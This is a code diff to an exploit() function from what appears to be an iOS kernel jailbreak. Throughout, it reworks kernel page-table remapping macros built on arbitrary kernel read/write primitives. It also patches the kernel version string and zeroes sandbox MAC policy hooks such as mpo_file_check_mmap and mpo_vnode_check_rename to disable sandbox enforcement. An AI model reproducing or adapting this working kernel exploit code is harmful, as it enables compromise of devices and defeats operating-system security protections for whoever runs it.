@@ -470,7 +470,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 #define PMK (PSZ-1)
     
     
-#define RemapPage(address) \
+#define RemapPage_(address) \
     pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
         uint64_t tte = ReadAnywhere64(tte_addr);\
         if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
@@ -494,11 +494,32 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere64(tte_addr, tte);\
         NSLog(@"level %llx - %llx", tte_addr,              TTE_GET(tte, TTE_PHYS_VALUE_MASK));\
     }, level1_table, isvad ? 1 : 2);
+    
+#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
+
+    uint64_t* remappage = calloc(512, 8);
+    
+    int remapcnt = 0;
+    
+    
+#define RemapPage(x)\
+    {\
+        int fail = 0;\
+        for (int i = 0; i < remapcnt; i++) {\
+            if (remappage[i] == (x & (~PMK))) {\
+                fail = 1;\
+            }\
+        }\
+        if (fail == 0) {\
+RemapPage_(x);\
+RemapPage_(x+PSZ);\
+            remappage[remapcnt++] = (x & (~PMK));\
+        }\
+    }
 
     level1_table = physp - gPhysBase + gVirtBase;
     WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
     
-#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
     
     uint64_t shtramp = kernbase + mh_kern->sizeofcmds + sizeof(struct mach_header_64);
     RemapPage(gadget_base + cpacr_idx*4);
@@ -520,7 +541,11 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 
     RemapPage(kernvers+whole_base-4);
     WriteAnywhere32(NewPointer(kernvers+whole_base-4), 1);
-    copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
+    
+    RemapPage(release+whole_base);
+    if (NewPointer(release+whole_base) == (NewPointer(release+whole_base+11) - 11)) {
+        copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
+    }
 
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
@@ -608,14 +633,15 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
          */
         
         uint64_t sbops = find_sbops();
-        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-
-        uint64_t nopag = sbops_end - sbops;
-
+        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
+        
+        uint64_t nopag = (sbops_end - sbops)/(PSZ);
+        
         int ctr = 0;
-        for (int i = 0; i < nopag; i+= PSZ) {
-            RemapPage(((sbops + i) & (~PMK)));
+        for (int i = 0; i < nopag; i++) {
+            RemapPage(((sbops + i*(PSZ)) & (~PMK)));
         }
+        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
